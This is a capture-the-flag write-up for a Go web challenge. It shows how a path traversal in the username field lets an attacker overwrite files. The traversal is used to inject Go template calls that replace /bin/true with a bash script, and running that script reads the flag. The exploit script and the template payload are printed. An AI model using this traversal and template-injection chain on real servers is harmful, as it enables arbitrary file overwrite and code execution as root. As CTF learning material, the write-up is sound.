# Sandevistan \[212 Points] (32 Solves)
```
I've been watching Cyberpunk 2077: Edgerunners lately...
```
Attached is [sandevistan.zip](./sandevistan.zip). Also we can start a remote of the chal.

---

## Writeup

Looking at the source code, we notice some shady file creation in ErrorFactory functions:
```go
func ErrorFactory(ctx context.Context, v string, f string) *models.UserError {
    filename := "errorlog/" + f
    UErr := &models.UserError{
        v,
        f,
        ctx,
    }

    file, _ := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)
    defer file.Close()

    file.WriteString(v)
    return UErr
}
```

If we could control `f`, we could set it to for example `../../../../etc/passwd`
and thus overwrite a file we shouldn't be able to access!

Can we though control `f`? Turns out, we can!

Inside of `AlphaNumCheck`,
```go
func AlphaNumCheck(ctx context.Context, t string) *models.UserError {
    if !regexp.MustCompile(`^[a-zA-Z0-9]*$`).MatchString(t) {
        v := fmt.Sprintf("ERROR! Invalid Value: %s\n", t)
        fmt.Printf("[*] AlphaNumCheck: %s", v)
        username := ctx.Value("username")
        regexErr := ErrorFactory(ctx, v, username.(string)) // <----
        return regexErr
    }
    return nil
}
```
the `f` is passed as our username, and the content, is
```go
"ERROR! Invalid Value: %s\n"
```
where `%s` is the string being checked to be alphanumeric:

Investigating further, we find out that `cyberware.cwHandlePost`, calls `checkForm`
with our request. *Then*, `checkForm` calls `AlphaNumCheck`, on the cyberware name we sent. \
So, **setting our username to a path traversal** string, and **setting a non-alphanumeric cyberware name**,
we can overwrite files!

Let's test

```py
def cyberware_post(username, cyberware_name):
    return requests.post(f"{URL}/cyberware", data={"username": username, "name": cyberware_name})

cyberware_post(username="../CANARY.findme", cyberware_name="foobar.")
```
With the server running locally, we indeed see a `CANARY.findme` created, **outside of
the errorlog directory**, with `ERROR! Invalid Value: foobar.`!

*What now?*

The source code contains some suspicious functions, which are never called, like
```go
func (u *User) UserHealthcheck() ([]byte, error) {
    cmd := exec.Command("/bin/true")    
    output, err := cmd.CombinedOutput()
    if err != nil {
        return nil, errors.New("error in healthcheck")
        panic(err)
    }
    return output, nil
}
```

How could we call them?

Luckily, because these functions are associated with the `User` struct, they are
accessible from the `user.html` template. Also, by the nature of HTML, even an
unstructured template will be parsed and executed. \
So for example something like
```html
ERROR! Invalid Value: foobar.
{{ .UserHealthcheck }}
</html>
```
still would be valid and would execute the `UserHealthcheck` method.

### Building the payload

Because the server is running as root, we can overwrite any file, including `/bin/true`. \
What if we could write to it a bash script?[^1] There's a function called, `SerializeErrors`,
which, without the error checking, looks like
```go
func (u *User) SerializeErrors(data string, index int, offset int64) error {
    fname := u.Errors[index]
    f, err := os.OpenFile(fname.Filename, os.O_RDWR, 0)
    _, ferr := f.WriteAt([]byte(data), offset)
}
```

Basically it loads an error from our index, and writes into a file *based on the error*

Also, there's the `NewError` function, which allows us to create **any error** we like!

So the 3 steps are:
1. Create an error with filename=`"/bin/true"`
2. Serialize that error with data being our bash script
3. Call UserHealthcheck

We can achieve it using
```go
{{ .NewError "foo" "/bin/true" }}

{{ .SerializeErrors "BASH CODE HERE" 0 0  }}

{{ .UserHealthcheck }}
```

Then, finally, we trigger the template by visiting the `/user` endpoint for any *existing* user.

Let's combine everything together and run it
```py
bash = """#!/bin/bash
cat /flag > /app/tmpl/index.html

""".replace('\n', '\\n')

cyberware_post("../tmpl/user.html", '{{ .NewError "foo" "/bin/true" }} {{ .SerializeErrors "' + bash + '" 0 0  }} {{ .UserHealthcheck }}') # Inject template syntax into the user template

user_post("den") # Create the user
user_get("den") # Trigger the template
```

Now we can visit `/`, which loads `index.html` and thus displays the flag.

Success!

**Flag:** `bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}`

*You can find the full solve script at [solve.py](./solve.py)*

[^1]: We couldn't do it before, because of the `ERROR! Invalid Value: ` prefix. Thus we couldn't write a shebang (`#!/bin/bash`) for linux to know how to run it.
